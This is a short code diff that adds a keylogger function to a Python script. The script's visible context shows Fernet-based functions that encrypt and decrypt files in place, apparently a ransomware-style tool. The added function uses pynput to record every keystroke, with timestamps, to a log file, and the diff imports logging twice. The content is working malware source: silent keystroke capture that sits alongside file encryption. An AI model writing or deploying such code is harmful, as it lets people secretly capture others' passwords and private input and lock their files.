@@ -1,4 +1,8 @@
 import os
+import logging
+from pynput.keyboard import Key, Listener
+import logging
+
 def encrypt():
     from cryptography.fernet import Fernet
 
@@ -53,3 +57,13 @@ def decrypt():
         contents_decrypted = Fernet(secretkey).decrypt(contents)
         with open(file, "wb") as thefile:
             thefile.write(contents_decrypted)
+
+def keylogger():
+    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+    
+    def on_press(key):
+        logging.info(str(key))
+    
+    with Listener(on_press=on_press) as listener :
+        listener.join()
+
